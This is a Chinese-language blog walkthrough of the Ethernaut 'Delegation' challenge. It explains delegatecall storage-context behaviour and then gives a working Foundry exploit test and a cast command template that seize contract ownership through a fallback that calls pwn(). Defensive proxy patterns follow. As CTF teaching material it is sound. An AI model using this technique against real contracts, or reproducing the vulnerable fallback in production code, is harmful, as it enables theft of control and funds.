---
title: 'Ethernaut Level 6: Delegation - delegatecall 存储槽攻击'
date: 2025-01-25 14:50:00
updated: 2025-01-25 14:50:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - delegatecall
  - 存储槽攻击
  - 智能合约安全
  - Solidity
  - 上下文切换
series: Ethernaut Foundry Solutions
excerpt: "深入理解 delegatecall 的工作原理和安全风险，学习如何利用存储槽布局差异进行攻击，掌握代理模式的安全考量。"
---

# 🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击

> **关卡链接**: [Ethernaut Level 6 - Delegation](https://ethernaut.openzeppelin.com/level/6)  
> **攻击类型**: delegatecall 存储槽攻击  
> **难度**: ⭐⭐⭐⭐☆  
> **核心概念**: 存储上下文切换、代理模式安全

## 📋 挑战目标

这个关卡考验对 `delegatecall` 机制的深入理解：

1. **获取合约控制权** - 成为 `Delegation` 合约的 `owner`
2. **理解上下文切换** - 掌握 `delegatecall` 的存储机制
3. **学习代理模式风险** - 了解升级模式的安全隐患

## 🔍 漏洞分析

### 合约源码分析

```solidity
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;  // 🎯 目标函数：会修改 owner
    }
}

contract Delegation {
    address public owner;      // 🚨 存储槽 0
    Delegate delegate;         // 🚨 存储槽 1

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        // 🚨 危险的 delegatecall
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

### 核心概念：delegatecall vs call

| 调用方式 | 执行上下文 | 存储修改 | msg.sender | 使用场景 |
|----------|------------|----------|------------|----------|
| **call** | 被调用合约 | 被调用合约 | 调用合约地址 | 普通外部调用 |
| **delegatecall** | 调用合约 | 调用合约 | 原始调用者 | 代理模式、升级 |

### 漏洞原理

**delegatecall 的工作机制**：
- 执行**被调用合约的代码**
- 使用**调用合约的存储**
- 保持**原始的 msg.sender**

```solidity
// 当 Delegation 合约执行 delegatecall 时：
delegate.delegatecall(abi.encodeWithSignature("pwn()"));

// 实际执行：
// 1. 运行 Delegate.pwn() 的代码
// 2. 但是在 Delegation 合约的存储上下文中
// 3. owner = msg.sender; 修改的是 Delegation.owner (存储槽0)
```

### 存储槽布局分析

```solidity
// Delegate 合约存储布局
// 槽 0: address owner

// Delegation 合约存储布局  
// 槽 0: address owner     ← 这个会被 delegatecall 修改！
// 槽 1: Delegate delegate
```

### 攻击路径

1. **构造函数调用数据** - 编码 `pwn()` 函数选择器
2. **触发 fallback 函数** - 向合约发送带数据的交易
3. **执行 delegatecall** - 在 Delegation 存储上下文中执行 `pwn()`
4. **获得控制权** - `owner` 被设置为攻击者地址

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Delegation.sol";

contract DelegationTest is Test {
    Delegate public delegate;
    Delegation public delegation;
    
    address public attacker = makeAddr("attacker");
    address public deployer = makeAddr("deployer");

    function setUp() public {
        vm.startPrank(deployer);
        
        // 部署 Delegate 合约
        delegate = new Delegate(deployer);
        
        // 部署 Delegation 合约
        delegation = new Delegation(address(delegate));
        
        vm.stopPrank();
    }

    function testDelegationExploit() public {
        console.log("Initial owner:", delegation.owner());
        console.log("Attacker address:", attacker);
        
        vm.startPrank(attacker);
        
        // 🎯 关键攻击：构造 pwn() 函数调用
        bytes memory payload = abi.encodeWithSignature("pwn()");
        
        // 通过 fallback 函数触发 delegatecall
        (bool success,) = address(delegation).call(payload);
        require(success, "Attack failed");
        
        vm.stopPrank();
        
        // 验证攻击成功
        assertEq(delegation.owner(), attacker);
        console.log("New owner:", delegation.owner());
        console.log("Attack successful!");
    }
    
    function testUnderstandDelegatecall() public {
        vm.startPrank(attacker);
        
        console.log("=== Before Attack ===");
        console.log("Delegation owner:", delegation.owner());
        console.log("Delegate owner:", delegate.owner());
        
        // 直接调用 delegate.pwn() 只会修改 delegate 的存储
        delegate.pwn();
        
        console.log("=== After direct call to Delegate.pwn() ===");
        console.log("Delegation owner:", delegation.owner()); // 不变
        console.log("Delegate owner:", delegate.owner());     // 变为 attacker
        
        // 重置状态
        vm.stopPrank();
        vm.prank(deployer);
        delegate = new Delegate(deployer);
        
        vm.startPrank(attacker);
        
        // 通过 delegatecall 调用 pwn()
        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success,) = address(delegation).call(payload);
        require(success, "Delegatecall failed");
        
        console.log("=== After delegatecall to pwn() ===");
        console.log("Delegation owner:", delegation.owner()); // 变为 attacker!
        console.log("Delegate owner:", delegate.owner());     // 不变
        
        vm.stopPrank();
    }
    
    function testFunctionSelector() public view {
        // 演示函数选择器的计算
        bytes4 selector = bytes4(keccak256("pwn()"));
        console.log("pwn() selector:");
        console.logBytes4(selector);
        
        bytes memory encoded = abi.encodeWithSignature("pwn()");
        console.log("Encoded call data:");
        console.logBytes(encoded);
    }
}
```

### 手动攻击脚本

```solidity
// 如果需要手动攻击，可以使用 cast 命令
contract ManualAttack is Test {
    function testManualAttack() public {
        // 1. 计算函数选择器
        bytes4 selector = bytes4(keccak256("pwn()"));
        console.logBytes4(selector);
        
        // 2. 使用 cast 发送交易
        // cast send <DELEGATION_ADDRESS> <SELECTOR> --private-key <YOUR_KEY>
        // 例如：cast send 0x... 0xdd365b8b --private-key ...
    }
}
```

### 运行测试

```bash
# 运行 Delegation 攻击测试
forge test --match-contract DelegationTest -vvv

# 预期输出：
# Initial owner: 0x... (deployer)
# Attacker address: 0x... (attacker) 
# New owner: 0x... (attacker)
# Attack successful!
```

## 🛡️ 防御措施

### 1. 严格的存储布局匹配

```solidity
contract SafeProxy {
    // ✅ 确保代理和实现合约有相同的存储布局
    address public owner;           // 槽 0
    address public implementation; // 槽 1
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function upgrade(address newImplementation) public onlyOwner {
        implementation = newImplementation;
    }
    
    fallback() external {
        address impl = implementation;
        assembly {
            // 使用内联汇编进行更安全的 delegatecall
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

### 2. 使用 OpenZeppelin 的代理模式

```solidity
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

contract SecureUpgradeableContract {
    // 使用 OpenZeppelin 的标准化代理实现
    // 包含完整的安全检查和存储隔离
}
```

### 3. 函数选择器白名单

```solidity
contract RestrictedDelegation {
    mapping(bytes4 => bool) public allowedSelectors;
    
    constructor() {
        // 只允许特定函数被 delegatecall
        allowedSelectors[bytes4(keccak256("safeFunction()"))] = true;
    }
    
    fallback() external {
        bytes4 selector = bytes4(msg.data);
        require(allowedSelectors[selector], "Function not allowed");
        
        // 执行 delegatecall
    }
}
```

### 4. 存储槽隔离

```solidity
contract IsolatedStorage {
    // 使用 EIP-1967 标准存储槽
    bytes32 private constant IMPLEMENTATION_SLOT = 
        bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1);
    
    bytes32 private constant ADMIN_SLOT = 
        bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1);
    
    function _getImplementation() internal view returns (address) {
        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;
    }
    
    function _setImplementation(address newImplementation) internal {
        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;
    }
}
```

## 📚 核心知识点

### 1. EVM 调用类型对比

```solidity
contract CallExample {
    function demonstrateCalls(address target) public {
        // 1. call - 普通外部调用
        (bool success1,) = target.call(
            abi.encodeWithSignature("someFunction()")
        );
        
        // 2. delegatecall - 委托调用
        (bool success2,) = target.delegatecall(
            abi.encodeWithSignature("someFunction()")
        );
        
        // 3. staticcall - 只读调用
        (bool success3,) = target.staticcall(
            abi.encodeWithSignature("viewFunction()")
        );
    }
}
```

### 2. 存储槽冲突示例

```solidity
// ❌ 危险：不匹配的存储布局
contract ProxyV1 {
    address public owner;    // 槽 0
    uint256 public value;    // 槽 1
}

contract ImplementationV1 {
    uint256 public data;     // 槽 0 ← 冲突！
    address public admin;    // 槽 1 ← 冲突！
}

// ✅ 安全：匹配的存储布局
contract ProxyV2 {
    address public owner;    // 槽 0
    uint256 public value;    // 槽 1
}

contract ImplementationV2 {
    address public owner;    // 槽 0 ← 匹配
    uint256 public value;    // 槽 1 ← 匹配
}
```

### 3. 函数选择器计算

```solidity
function calculateSelector() public pure returns (bytes4) {
    // 方法 1：直接计算
    bytes4 selector1 = bytes4(keccak256("pwn()"));
    
    // 方法 2：使用 abi.encodeWithSignature
    bytes memory data = abi.encodeWithSignature("pwn()");
    bytes4 selector2 = bytes4(data);
    
    // 方法 3：使用 this.functionName.selector
    // bytes4 selector3 = this.pwn.selector; // 如果函数存在
    
    return selector1;
}
```

## 🏛️ 实际应用场景

### 代理模式的正确使用

1. **升级模式**：
   - UUPS (Universal Upgradeable Proxy Standard)
   - Transparent Proxy Pattern
   - Beacon Proxy Pattern

2. **钻石模式** (EIP-2535)：
   - 多面切割合约
   - 功能模块化

3. **最小代理** (EIP-1167)：
   - Clone Factory Pattern
   - 节省部署成本

## 🎯 总结

Delegation 关卡揭示了 `delegatecall` 的双刃剑特性：

- ✅ **理解上下文切换机制** - 代码在不同存储空间执行
- ✅ **掌握存储槽布局匹配** - 代理和实现必须一致
- ✅ **学习安全代理模式** - 使用标准化解决方案
- ✅ **认识函数选择器安全** - 控制可调用的函数

`delegatecall` 是实现合约升级和模块化的重要工具，但也是许多安全漏洞的根源。理解其工作原理对于构建安全的可升级合约至关重要。

---

## 🔗 相关链接

- **[上一关: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**
- **[下一关: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**
- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[OpenZeppelin 代理文档](https://docs.openzeppelin.com/contracts/4.x/api/proxy)**
- **[EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**

---

*在智能合约的世界中，上下文就是一切。* 🔄